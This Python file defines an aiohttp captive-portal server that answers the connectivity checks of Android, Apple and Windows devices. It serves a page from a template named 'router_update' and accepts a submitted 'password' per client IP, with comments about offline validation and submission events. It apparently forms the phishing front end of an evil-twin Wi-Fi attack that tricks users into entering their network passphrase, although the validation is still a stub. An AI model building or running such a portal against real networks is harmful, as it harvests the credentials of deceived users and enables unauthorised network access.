import asyncio
import os
from collections import defaultdict
from aiohttp import web
import aiohttp_jinja2
import jinja2

class CaptivePortalServer:
    def __init__(self, template_dir: str, event_bus, db_session):
        self.template_dir = template_dir
        self.event_bus = event_bus
        self.db_session = db_session
        self._submission_locks = defaultdict(asyncio.Lock)
        self.app = web.Application()
        
        # Setup Jinja2 templates
        aiohttp_jinja2.setup(self.app, loader=jinja2.FileSystemLoader(template_dir))
        
        # Setup static routes
        self.app.router.add_static('/static/', path=os.path.join(template_dir, 'static'), name='static')
        
        # Portal detection routes
        self.app.router.add_get('/generate_204', self.handle_generate_204)
        self.app.router.add_get('/hotspot-detect.html', self.handle_hotspot_detect)
        self.app.router.add_get('/connecttest.txt', self.handle_connecttest)
        self.app.router.add_get('/redirect', self.handle_redirect)
        
        # Main entry points
        self.app.router.add_get('/', self.handle_index)
        self.app.router.add_post('/submit', self.handle_submit)
        
        self.runner = None
        self.site = None

    async def start(self, host='0.0.0.0', port=80):
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()
        self.site = web.TCPSite(self.runner, host, port)
        await self.site.start()

    async def stop(self):
        if self.runner:
            await self.runner.cleanup()
            
    # OS Detection Handlers
    async def handle_generate_204(self, request):
        return web.Response(status=204)

    async def handle_hotspot_detect(self, request):
        return web.Response(text="<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>", content_type="text/html")

    async def handle_connecttest(self, request):
        return web.Response(text="Microsoft NCSI")

    async def handle_redirect(self, request):
        raise web.HTTPFound('/')

    @aiohttp_jinja2.template('router_update/html/index.html')
    async def handle_index(self, request):
        return {} # Pass context variables to the template

    async def handle_submit(self, request):
        data = await request.post()
        password = data.get('password')
        client_ip = request.remote
        
        async with self._submission_locks[client_ip]:
            # Validation logic here using OfflineValidator
            # For MVP stub, we accept everything and return 200
            
            # Emit event
            # await self.event_bus.publish(Event(tag='portal.submission', payload={'client_ip': client_ip, 'result': 'valid'}))
            
            return web.Response(text="Validated", status=200)

